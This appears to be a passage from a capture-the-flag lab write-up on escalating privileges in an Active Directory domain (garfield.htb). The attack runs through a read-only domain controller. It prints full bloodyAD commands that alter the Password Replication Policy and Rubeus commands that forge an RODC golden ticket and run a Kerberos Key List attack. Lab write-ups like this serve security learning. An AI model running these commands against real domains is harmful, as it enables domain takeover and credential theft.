We have successfully retrieved the AES key of the KRBTGT_8245 user. Before we can actually use this information for privilege escalation on the main Domain Controller, we need to modify the permission configuration of l.wilson_adm.

The key allows us to issue TGT tokens as if we were the DC, using credentials cached inside RODC01. However, there are situations where, for security reasons, the credentials of certain users are not cached. This is managed by the DENIED RODC PASSWORD REPLICATION GROUP and ALLOWED RODC PASSWORD REPLICATION GROUP groups, which control which users respectively cannot or must be cached by the Read Only Domain Controller.

These groups are managed inside the RODC via two attributes: msDS-NeverRevealGroup and msDS-RevealOnDemandGroup. To modify them we need a domain user with the RODC Administrator role.

Through Bloodhound I discover that l.wilson_adm, being a member of the TIER 1 group, can add itself to the RODC Administrators group to obtain these privileges.

cat privilege-escalation

Using the graphical interface I add the role to the user:

I can now use the credentials of l.wilson_adm to modify the msDS-NeverRevealGroup and msDS-RevealOnDemandGroup attributes with the goal of removing the ADMINISTRATORS group from the non-cached list and adding it to the allowed list, effectively modifying the Password Replication Policy.

1. Clearing msDS-NeverRevealGroup

python3 bloodyAD.py --host "DC01.garfield.htb" -d "garfield.hrb" -u "l.wilson_adm" -p "Password123!" set object 'RODC01$' msDS-NeverRevealGroup

2. Setting msDS-RevealOnDemandGroup

python3 bloodyAD.py --host "DC01.garfield.htb" -d "garfield.hrb" -u "l.wilson_adm" -p "Password123!" set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=ALLOWED RODC PASSWORD REPLICATION GROUP,CN=USERS,DC=GARFIELD,DC=HTB' -v 'CN=ADMINISTRATORS,CN=BUILTIN,DC=GARFIELD,DC=HTB'

Now that the Password Replication Policy has been modified, we will use a technique known as Kerberos Key List Attack (golden ticket) to obtain an Administrator ticket on DC01. This technique is documented at the following resource.

.\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357

mv .\ticket_2026_04_24_18_48_34_Administrator_to_krbtgt@GARFIELD.HTB.kirbi ticket.kirbi

.\Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:ticket.kirbi /service:krbtgt/garfield.htb
